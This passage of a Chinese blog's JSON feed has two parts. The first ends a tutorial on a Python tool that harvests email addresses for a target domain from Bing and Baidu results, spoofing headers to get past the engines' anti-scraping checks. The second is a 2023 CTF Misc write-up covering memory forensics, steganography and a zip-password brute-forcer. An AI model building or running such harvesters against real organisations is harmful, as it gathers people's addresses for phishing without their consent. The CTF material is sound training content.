表示代码本身的文件路径，sys.argv [1:] 表示从第一个命令行参数到输入的最后一个命令行参数，存储形式为 list 类型：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;</span><br><span class=\"line\">    #定义异常</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        start(sys.argv[1:])</span><br><span class=\"line\">    except KeyboardInterrupt:</span><br><span class=\"line\">        print(&quot;interrupted by user, killing all threads...&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>编写命令行参数处理功能。此处主要应用 getopt.getopt () 函数处理命令行参数，该函数目前有短选项和长选项两种格式。短选项格式为 &quot;-&quot; 加上单个字母选项；长选项格式为 &quot;--&quot; 加上一个单词选项。opts 为一个两元组列表，每个元素形式为 &quot;(选项串，附加参数)&quot;。当没有附加参数时，则为空串。之后通过 for 语句循环输出 opts 列表中的数值并赋值给自定义变量：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def start(argv):</span><br><span class=\"line\">    url = &quot; &quot;</span><br><span class=\"line\">    pages = &quot; &quot;</span><br><span class=\"line\">    if len(sys.argv) &lt; 2:</span><br><span class=\"line\">        print(&quot;-h 帮助信息 ;\\n&quot;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    #定义异常处理</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        bannner()</span><br><span class=\"line\">        opts,args = getopt.getopt(argv,&quot;-u;-p;-h&quot;)</span><br><span class=\"line\">    except getopt.GetoptError:</span><br><span class=\"line\">        print(&#x27;Error an argument!&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    for opt,arg in opts:</span><br><span class=\"line\">        if opt == &quot;-u&quot;:</span><br><span class=\"line\">            url = args</span><br><span class=\"line\">        elif opt == &quot;-p&quot;:</span><br><span class=\"line\">            pages = arg</span><br><span class=\"line\">        elif opt == &quot;-h&quot;:</span><br><span class=\"line\">            print(usage())</span><br><span class=\"line\">    launcher(url,pages)</span><br></pre></td></tr></table></figure></p>\n<p>输出帮助信息，增加代码工具的可读性和易用性。为了使输出信息更加美观简洁，可以通过转译字符设置输出字体颜色，从而实现需要的效果，开头部分包含三个参数：显示方式、前景色、背景色。这三个参数是可选的，可以只写其中的某一参数。结尾部分可以省略，但是为了书写规范，建议以 &quot;\\033 [0m&quot; 结尾</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">开头：\\033[显示方式;前景色;背景色m]</span><br><span class=\"line\">结尾部分：\\033[0m</span><br></pre></td></tr></table></figure></p>\n<p>示例代码：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&#x27;\\033[0;30;41m 你好 \\033[0m&#x27;)</span><br><span class=\"line\">print(&#x27;\\033[0;30;47m 你好 \\033[0m&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>输出显示：<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6LLEP3RsCoh5eujI.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/amEWiG135rsDgVAA.png!thumbnail\" alt=\"\" /></p>\n<p>先以图案形式输出脚本出自 MS08067 实验室，然后输出有关脚本使用的帮助信息，即可执行参数执行以及对应的功能简介</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#banner信息</span><br><span class=\"line\">def banner():</span><br><span class=\"line\">    print(&#x27;\\033[1;34m###############################################################################################\\033[0m\\n&#x27;&#x27;\\033[1;34m#############################################\\033[1;32mMS08067实验室\\033[1;34m#############################################\\033[0m\\n&#x27;&#x27;\\033[1;34m##########################################################################################################\\033[0m\\n&#x27;)</span><br><span class=\"line\">#使用规则</span><br><span class=\"line\">def usage():</span><br><span class=\"line\">    print(&#x27;-h: --help 帮助;&#x27;)</span><br><span class=\"line\">    print(&#x27;-u: --url 域名;&#x27;)</span><br><span class=\"line\">    print(&#x27;-p: --pages 页数;&#x27;)</span><br><span class=\"line\">    print(&#x27;eg:python -u &quot;www.baidu.com&quot; -p 100&#x27;+&#x27;\\n&#x27;)</span><br><span class=\"line\">    sys.exit()</span><br></pre></td></tr></table></figure></p>\n<p>同时也可以根据自己的喜好设置输出不同类型的字体颜色或者图案<br />\n确定搜索邮件的关键字，并调用 bing_search () 和 baidu_search () 两个函数，返回 Bing 与百度两大搜索引擎的查询结果，由获取到的结果进行列表合并，去重之后循环输出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#漏洞回调函数</span><br><span class=\"line\">def launcher(url,pages):</span><br><span class=\"line\">    email_num = []</span><br><span class=\"line\">    key_words = [&#x27;email&#x27;,&#x27;mail&#x27;,&#x27;mailbox&#x27;,&#x27;邮件&#x27;,&#x27;邮箱&#x27;,&#x27;postbox&#x27;]</span><br><span class=\"line\">    for page in range(1,int(pages)+1):</span><br><span class=\"line\">        for key_word in key_words:</span><br><span class=\"line\">            bing_emails = bing_search(url,page,key_word)</span><br><span class=\"line\">            baidu_emails = baidu_search(url,page,key_word)</span><br><span class=\"line\">            sum_emails = bing_emails + baidu_emails</span><br><span class=\"line\">            for email in sum_emails:</span><br><span class=\"line\">                if email in email_num:</span><br><span class=\"line\">                    pass</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    print(email)</span><br><span class=\"line\">                    with open(&#x27;data.txt&#x27;,&#x27;a+&#x27;) as f:</span><br><span class=\"line\">                        f.write(email + &#x27;\\n&#x27;)</span><br><span class=\"line\">                    email_num.append(email)</span><br></pre></td></tr></table></figure></p>\n<p>用 Bing 搜索引擎进行邮件爬取。Bing 引擎具有反爬系统，会通过限定 referer、cookie 等信息来确定是否是网页爬取操作。可以通过指定 referer 与 request.session () 函数自动获取 cookie 信息，绕过 Bing 搜索引擎的防爬防护</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def bing_search(url,page,key_word):</span><br><span class=\"line\">    referer = &quot;http://cn.bing.com/search?q=email+site%3abaidu.com&amp;qs=n&amp;sp=-1&amp;pq=emailsite%3baidu.com&amp;first=1&amp;FROM=PERE1&quot;</span><br><span class=\"line\">    conn = requests.session()</span><br><span class=\"line\">    bing_url = &quot;http://cn.bing.com/search?q=&quot; + key_word + &quot;+site%3a&quot; + url + &quot;&amp;qs=n&amp;sp=-1&amp;pq=&quot; + key_word + &quot;site%3a&quot; + url + &quot;&amp;first=&quot; +str((page-1)*10) + &quot;&amp;FROM=FEERE1&quot;</span><br><span class=\"line\">    conn.get(&#x27;http://cn.bing.com&#x27;,headers=headers(referer))</span><br><span class=\"line\">    r = conn.get(bing_url,stream=True,headers=headers(referer),timeout=8)</span><br><span class=\"line\">    emails = search_email(r.text)</span><br><span class=\"line\">    return emails</span><br></pre></td></tr></table></figure></p>\n<p>用百度搜索引擎进行邮件爬取。同样的，百度搜索引擎也做了反爬防护，相对于 Bing 来说，百度不仅对 referer 和 cookie 进行校验，也同时在页面中通过 JavaScript 语句进行动态请求链接，从而导致不能动态获取页面中的信息。可以通过对链接的提取，再进行 request 请求，从而绕过百度搜索引擎的反爬设置</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def baidu_search(url,page,key_word):</span><br><span class=\"line\">    email_list = []</span><br><span class=\"line\">    emails = []</span><br><span class=\"line\">    referer = &quot;https://www.baidu.com/s?wd=email+site%3Abaidu.com&amp;pn=1&quot;</span><br><span class=\"line\">    baidu_url = &quot;https://www.baidu.com/s?wa=&quot;+key_word+&quot;+site%3A&quot;+url+&quot;&amp;pn=&quot;+str((page-1)*10)</span><br><span class=\"line\">    conn = requests.session</span><br><span class=\"line\">    conn.get(referer,headers=headers(referer))</span><br><span class=\"line\">    r = conn.get(baidu_url,headers=headers(referer))</span><br><span class=\"line\">    soup = BeautifulSoup(r.txt,&#x27;html&#x27;)</span><br><span class=\"line\">    tagh3 = soup.find_all(&#x27;h3&#x27;)</span><br><span class=\"line\">    for h3 in tagh3:</span><br><span class=\"line\">        href = h3.find(&#x27;a&#x27;).get(&#x27;href&#x27;)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            r = requests.get(href,headers=headers(referer),timeout=8)</span><br><span class=\"line\">            emails = search_email(r.txt)</span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        for email in emails:</span><br><span class=\"line\">            email_list.append(email)</span><br><span class=\"line\">    return email_list</span><br></pre></td></tr></table></figure></p>\n<p>接下来通过正则表达式获取邮箱号码，此处也可换成目标企业邮箱的正则表达式：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def search_email(html):</span><br><span class=\"line\">    emails = re.findall(r&quot;[a-z0-9\\.\\-+_]+@[a-z0-9\\.\\-+_]+\\.[a-z]+&quot;,html,re.I)</span><br><span class=\"line\">    return emails</span><br><span class=\"line\">def headers(referer):</span><br><span class=\"line\">    headers = &#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0(X11;Linux x86_64;rv:60.0) Gecko/20100101 Firefoc/60.0&#x27;,</span><br><span class=\"line\">               &#x27;Accept&#x27;:&#x27;*/*&#x27;</span><br><span class=\"line\">               &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class=\"line\">               &#x27;Accept-Encoding&#x27;: &#x27;gzip,deflate&#x27;,</span><br><span class=\"line\">               &#x27;Referer&#x27;:referer</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">    return headers</span><br></pre></td></tr></table></figure></p>\n<p>用 python3 执行脚本，-u 参数指定域名，-p 参数指定搜索引擎的页数，如：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ce.py -u &quot;baidu.com&quot; -p 1</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%AE%89%E6%B4%B5%E6%9D%AF2023%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%AE%89%E6%B4%B5%E6%9D%AF2023%20Misc/",
            "title": "安洵杯2023 Misc",
            "date_published": "2024-04-16T05:58:19.041Z",
            "content_html": "<h1 id=\"安洵杯2023-misc\"><a class=\"anchor\" href=\"#安洵杯2023-misc\">#</a> 安洵杯 2023 Misc</h1>\n<h2 id=\"dacongのwindows\"><a class=\"anchor\" href=\"#dacongのwindows\">#</a> <strong>dacong の Windows</strong></h2>\n<p>题目描述是：好像什么重要的表被修改了，猜测是注册表文件被修改</p>\n<p>刚开始利用 vol2 进行查看 imageinfo 的信息，发现镜像文件为 win10，于是就改用了 vol3，避免出现一些问题</p>\n<h3 id=\"flag3\"><a class=\"anchor\" href=\"#flag3\">#</a> flag3：</h3>\n<p>首先按照老套路扫描一下文件，直接 grep 出关键字符串 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f dacong.raw windows.filescan | grep flag</span><br></pre></td></tr></table></figure></p>\n<p>发现了桌面上的 flag3.txt 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225181103520.png\" alt=\"\" /></p>\n<p>dump 下来进行查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f ../../dacong.raw windows.dumpfiles --virtaddr=&quot;0xe0007a09d470&quot;</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225181219320.png\" alt=\"\" /></p>\n<p>得到：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U2FsdGVkX18M+E34cKJlmTU3uo1lHqjUQhKPTBGJiMjg4RWX6saTjOJmLU86538e</span><br></pre></td></tr></table></figure></p>\n<p>发现还套了一层加密，看上去像是 aes，需要寻找 key，而这里的 key 就在题目所提示的注册表当中</p>\n<p>用命令列出注册表的所有键值</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f ../../dacong.raw windows.registry.printkey</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225182915579.png\" alt=\"\" /></p>\n<p>能发现一个类似 key 的字符串，拿去解密一下试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225183338699.png\" alt=\"\" /></p>\n<p>直接用 puzzle 爆破出来了 flag3：dAc0Ng_SIst3Rs????}</p>\n<h3 id=\"flag2\"><a class=\"anchor\" href=\"#flag2\">#</a> flag2：</h3>\n<p>利用取证大师对文件进行深度恢复之后再次进行自动取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225185122528.png\" alt=\"\" /></p>\n<p>发现回收站删除的文件中有个 secret.rar 文件，进行导出并解压</p>\n<p>全选之后根据文本内容提示猜测为 snow 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225185243753.png\" alt=\"\" /></p>\n<p>无密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\SNOW.EXE -C flag2.txt</span><br></pre></td></tr></table></figure></p>\n<p>得到 flag2:_tHE_Dddd</p>\n<h3 id=\"flag1\"><a class=\"anchor\" href=\"#flag1\">#</a> flag1：</h3>\n<p>利用 R-studio 扫描文件，在 miku 的桌面上发现了很多的 dacong.wav</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225191203991.png\" alt=\"\" /></p>\n<p>直接恢复出来发现音频都有些问题，包括之前的 secret.rar 文件用 R-studio 恢复出来也是损坏的，这里可以使用 vol3 进行 dump</p>\n<p>一个个听一下发现 dacong39.wav 是 sstv，用 rxsstv 进行识别得到 flag1</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225200952125.png\" alt=\"\" /></p>\n<p>flag1：flag{Ar3_Th3Y</p>\n<p>拼接得到完整 flag</p>\n<p><strong>flag{Ar3_Th3Y_tHE_DddddAc0Ng_SIst3Rs????}</strong></p>\n<h2 id=\"疯狂的麦克斯\"><a class=\"anchor\" href=\"#疯狂的麦克斯\">#</a> 疯狂的麦克斯</h2>\n<p>拿到三个文件，首先看到了 FLAG.zip，根据题目描述应该是最后的 flag 文件，先看看无后缀的麦克斯的称号</p>\n<p>记事本打开发现存在一些不可见的字符</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225202958815.png\" alt=\"\" /></p>\n<p>猜测零宽，解密得到称号 mks007</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225203137452.png\" alt=\"\" /></p>\n<p>接着嗨.zip 文件解压出来 word 文件，修改后缀为 zip 之后发现了 MKS<br />\nIM 麦克斯.txt 文件</p>\n<p>打开发现是字符表，文本末尾还有一串字符串</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225203750741.png\" alt=\"\" /></p>\n<p>经过尝试得知是凯撒移位</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225204056165.png\" alt=\"\" /></p>\n<p>根据后来修改的题目描述可以知道压缩包密码是某个值的 base64，文本末尾算是个凯撒的提示吧，把整个字符表进行凯撒位移</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226135340902.png\" alt=\"\" /></p>\n<p>利用脚本将列表中的每个值进行 base64 加密并对压缩包进行爆破</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">import zipfile</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">zip_file_path = &#x27;your_zip_file.zip&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">values = [&#x27;71132E&#x27;, &#x27;328051N&#x27;, &#x27;248199O&#x27;, &#x27;96369v&#x27;, &#x27;216076R&#x27;,...] #替换成完整列表</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def encode_base64_and_crack_zip(values, zip_file_path):</span><br><span class=\"line\"></span><br><span class=\"line\">    passwords = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    for value in values:</span><br><span class=\"line\"></span><br><span class=\"line\">        encoded_value = base64.b64encode(value.encode()).decode()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        try:</span><br><span class=\"line\"></span><br><span class=\"line\">            with zipfile.ZipFile(zip_file_path, &#x27;r&#x27;) as zip_file:</span><br><span class=\"line\"></span><br><span class=\"line\">                zip_file.extractall(pwd=encoded_value.encode())</span><br><span class=\"line\"></span><br><span class=\"line\">                passwords[encoded_value] = value</span><br><span class=\"line\"></span><br><span class=\"line\">                print(f&quot;Correct password found: &#123;encoded_value&#125; for value: &#123;value&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\"></span><br><span class=\"line\">            pass</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    return passwords</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">passwords_dict = encode_base64_and_crack_zip(values, zip_file_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;\\nPasswords and corresponding base64 values:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">for password, value in passwords_dict.items():</span><br><span class=\"line\"></span><br><span class=\"line\">    print(f&quot;Password: &#123;password&#125; -&gt; Value: &#123;value&#125;&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>输出：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Correct password found: NDU2Nzg4UA== for value: 456788P</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Passwords and corresponding base64 values:</span><br><span class=\"line\"></span><br><span class=\"line\">Password: NDU2Nzg4UA== -&gt; Value: 456788P</span><br></pre></td></tr></table></figure></p>\n<p>得到密码：NDU2Nzg4UA==</p>\n<p>解压得到 flag</p>\n<p><strong>D0g3{Th1s_REA11Y_MAX_F1A4_GGB0ND}</strong></p>\n<h2 id=\"nahida\"><a class=\"anchor\" href=\"#nahida\">#</a> <strong>Nahida</strong></h2>\n<p>在 hi.txt 中没有发现什么隐写信息，查看无后缀文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140218726.png\" alt=\"\" /></p>\n<p>发现是 jpg 文件的翻转文件，利用脚本逆回来</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as f: #1.txt中存放原文件的16进制数据</span><br><span class=\"line\"></span><br><span class=\"line\">    x = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">    s = x[::-1]</span><br><span class=\"line\"></span><br><span class=\"line\">with open(&#x27;1.jpg&#x27;,&#x27;wb&#x27;) as f:</span><br><span class=\"line\"></span><br><span class=\"line\">    f.write(bytes.fromhex(s))</span><br></pre></td></tr></table></figure></p>\n<p>得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140705500.png\" alt=\"\" /></p>\n<p>重新放入 winhex 查看发现末尾多了些乱码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140833855.png\" alt=\"\" /></p>\n<p>重新将 16 进制提取出来进行解码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140933203.png\" alt=\"\" /></p>\n<p>提示早已出现在你的旅途，和神之眼，猜测是 silenteye</p>\n<p>密码为文件的名称 Nahida，decode 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226141403854.png\" alt=\"\" /></p>\n<p><strong>d0g3{Nahida_is_the_best_in_the_world!}</strong></p>\n<h2 id=\"dacongのsecret\"><a class=\"anchor\" href=\"#dacongのsecret\">#</a> <strong>dacong の secret</strong></h2>\n<p>得到两个附件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226141857261.png\" alt=\"\" /></p>\n<p>png FFT 得到压缩包密码：d@C0ng 1s cUt3!!!</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142126810.png\" alt=\"\" /></p>\n<p>winhex 查看解压出来的 jpg 发现图片末尾存放着压缩包的 16 进制数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142355206.png\" alt=\"\" /></p>\n<p>同样 reverse 之后写入到文件当中，根据题目描述可知，这一层的压缩包密码也在 png 当中</p>\n<p>binalk 图片时发现图片中有多余的数据块，tweak 查看下 idat 块</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142801972.png\" alt=\"\" /></p>\n<p>发现最后的 idat 块存在异常，单独提取出来</p>\n<p>补上 dacong1hao.png 的文件头</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143326676.png\" alt=\"\" /></p>\n<p>利用 puzzle 对该图片进行 fix，得到解压密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143557938.png\" alt=\"\" /></p>\n<p>一眼 base64 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143911632.png\" alt=\"\" /></p>\n<p>解码得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226144533891.png\" alt=\"\" /></p>\n<p>pass {m1ku_1s_sha_fufu123}，依然是个 pass，jpg 的 jphide 隐写</p>\n<p>解密得到 flag</p>\n<p><strong>flag{d@C0ng_1s_r3@lIy_Re@iLY_Cute}</strong></p>\n<p>小结：这次比赛 misc 知识点难度倒是不大，但是很套，需要猜的知识点和步骤也比较多</p>\n",
            "tags": [
                "MISC",
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/USB/",
            "url": "https://nnnpc.github.io/2024/04/16/USB/",
            "title": "USB",
            "date_published": "2024-04-16T05:58:19.038Z",
